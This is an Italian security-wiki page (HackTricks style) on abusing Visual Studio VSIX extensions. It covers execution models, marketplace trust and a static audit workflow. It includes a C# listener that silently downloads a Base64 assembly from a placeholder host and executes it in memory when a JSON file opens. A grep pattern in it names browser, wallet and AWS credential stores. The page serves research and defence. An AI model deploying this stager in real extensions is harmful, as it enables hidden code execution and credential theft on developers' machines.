# Abuso delle estensioni VSIX di Visual Studio

{{#include ../banners/hacktricks-training.md}}

Un'estensione di Visual Studio può trasformare le normali attività nell'editor in esecuzione di codice con l'identità dell'utente connesso. Un VSIX dannoso, un publisher che si spaccia per un altro o un aggiornamento compromesso di un'estensione possono raggiungere quell'utente tramite i normali canali di installazione. L'installazione con una richiesta di autorizzazione da amministratore è un percorso di installazione consentito dall'utente, non un'escalation automatica dei privilegi.<sup>[[1]](#references)</sup>

## Modello di esecuzione

Le estensioni VSSDK classiche vengono comunemente eseguite all'interno di `devenv.exe`. Il modello più recente `VisualStudio.Extensibility` esegue principalmente le estensioni .NET moderne fuori processo: Visual Studio fa da broker per le chiamate a un processo dedicato `Microsoft.ServiceHub.Host.Extensibility`, isolando la stabilità dell'IDE, ma **non** isolando in una sandbox l'estensione dai permessi Windows dell'utente. Il nome esatto dell'eseguibile può includere un suffisso relativo all'architettura, ad esempio `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Attivazione durante le normali attività nell'editor

Invece di esporre solo un comando di menu evidente, un'estensione può implementare `ITextViewOpenClosedListener`. Il callback `TextViewOpenedAsync` viene invocato per i documenti corrispondenti, mentre `TextViewExtensionConfiguration.AppliesTo` può limitare l'attivazione a un tipo comune come JSON. Un formatter o un linter legittimo può continuare a svolgere il lavoro dichiarato, mentre una seconda azione viene eseguita come effetto collaterale dell'apertura di un file.<sup>[[1]](#references)[[3]](#references)</sup>

Il seguente schema ridotto mostra i punti di esecuzione importanti; per chiarezza, omette il formatter legittimo e la gestione degli errori.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Caricatore di assembly gestiti in memoria attivato da un evento</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Questa chain scarica testo Base64, lo decodifica in byte assembly, lo carica da un `MemoryStream` tramite un `AssemblyLoadContext` collectible, invoca l’`EntryPoint` riflesso senza parametri o con un `string[]`, attende gli entry point asincroni e scarica il contesto. La seconda fase non viene scritta su disco, anche se il VSIX e la DLL principale dell’estensione restano artefatti su disco. Base64 non offre autenticità né riservatezza; inoltre, l’uso di HTTP consente a un aggressore in posizione on-path di sostituire la risposta.<sup>[[1]](#references)</sup>

Le varianti operative includono la soppressione di tutte le eccezioni, affinché la funzionalità pubblicizzata continui a funzionare quando lo staging fallisce, oppure l’uso di `ITextViewChangedListener` per attivare il codice dopo le modifiche. Il codice viene eseguito nell’host dell’estensione e può usare le API gestite, P/Invoke, file, credenziali e processi figlio disponibili per quell’utente.<sup>[[1]](#references)</sup>

Per una superficie di esecuzione correlata e specifica dell’editor, basata sul caricamento automatico di plugin nativi, vedere:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Abuso della fiducia nel Marketplace e nella distribuzione

Un VSIX può essere distribuito come file condiviso direttamente o tramite phishing, dal Marketplace web oppure attraverso il browser Marketplace integrato in Visual Studio. Una registrazione dell’editore che impone principalmente l’unicità e una lista di parole riservate può consentire identità di editor visivamente suggestive; compromettere un editore o un’estensione già considerati affidabili è ancora più efficace, perché consente di raggiungere la base utenti che li ha installati. L’installazione dal Marketplace avvia Visual Studio Installer e colloca temporaneamente il VSIX scaricato in `%LOCALAPPDATA%\Temp`; anche `payload.vsix` viene usato legittimamente, quindi il solo nome del file non è un indicatore.<sup>[[1]](#references)</sup>

MDSec non ha individuato un protocollo URL di Visual Studio che installi direttamente un’estensione. L’operatore deve comunque indurre l’utente a installare e considerare attendibile il VSIX, oppure compromettere il canale di distribuzione di un’estensione esistente. Un pacchetto `AllUsers` viene installato nella cartella di installazione di Visual Studio e può richiedere l’elevazione, ma si tratta del normale comportamento di un installer con consenso, non di un percorso automatico per ottenere i privilegi di amministratore o SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Audit statico su larga scala

I pacchetti VSIX sono solitamente archivi ZIP, quindi una pipeline sicura per la revisione del Marketplace può enumerare i pacchetti, decomprimerli **senza caricare il codice delle estensioni**, analizzare i manifest, identificare le superfici eseguibili e decompilare gli assembly gestiti con `ilspycmd`. Dare priorità agli assembly dell’estensione, escludendo le dipendenze comuni incluse nel pacchetto, quindi correlare le stringhe relative agli archivi di credenziali con cluster di comportamenti come lettura di file più invio in rete, codifica più invio, download più esecuzione, accesso al gestore delle credenziali più accesso alla rete oppure acquisizione di screenshot più invio.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Inoltre, fai l’inventario delle DLL native, dei target MSBuild, degli script, dei template T4 e dei payload degli installer, invece di presumere che ogni superficie di esecuzione sia costituita da codice gestito. Confronta i comportamenti sospetti con lo scopo dichiarato nel manifest: la telemetria e gli updater legittimi possono sembrare esfiltrazione o staging. Un’analisi solo statica non rileva codice compresso, offuscato, risolto dinamicamente o dormiente; inoltre, esaminare solo la versione più recente fa perdere le release storiche malevole.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Estensioni di Visual Studio: un nuovo sguardo](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Informazioni su VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Anatomia di un pacchetto VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - Strumento .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
